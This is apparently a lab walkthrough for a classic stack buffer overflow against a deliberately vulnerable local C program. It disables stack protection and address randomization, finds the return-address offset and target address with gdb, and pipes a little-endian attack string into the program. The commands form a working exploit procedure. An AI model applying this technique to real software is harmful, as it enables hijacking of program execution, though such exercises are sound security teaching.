1) Compile program.
gcc ./vuln_program.c -fno-stack-protector -z execstack -static -o vuln_program

2) Disable randomization.
sudo sysctl -w kernel.randomize_va_space=0

3) Use gdb to find buffer allocation size. Disassemble function including buffer to do so.
 In this case it is equal to 108. With an addition of ebp it equals a total of 112.

4) Use gdb to find starting address of target function. Disassemble the target function.
 In my case it is 0x08048e7f.

5) Add the adress to 112 random chars in reverse order to achieve little-endian format and overwrite return adress.
gcc ./attack-string.c -fno-stack-protector -z execstack -static -o attack-string
./attack-string $'\x7f\x8e\x04\x08' > ./attack.input

6) Then use generated attack input to hack the program.
./vuln_program < ./attack.input
